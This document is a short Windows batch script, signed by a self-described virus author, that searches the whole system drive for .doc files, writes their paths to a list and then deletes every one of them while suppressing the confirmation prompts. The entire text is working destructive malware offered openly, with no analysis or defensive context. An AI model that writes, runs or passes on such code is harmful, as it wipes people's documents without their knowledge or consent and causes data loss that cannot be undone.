@ echo off
rem ---------------------------------
rem Delete All Documents
DIR /S/B %SystemDrive%\*.doc >> FIleList_doc.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (FIleList_doc.txt) do del "%%j:%%k"
rem ---------------------------------


__-Virus Author: subhojit-__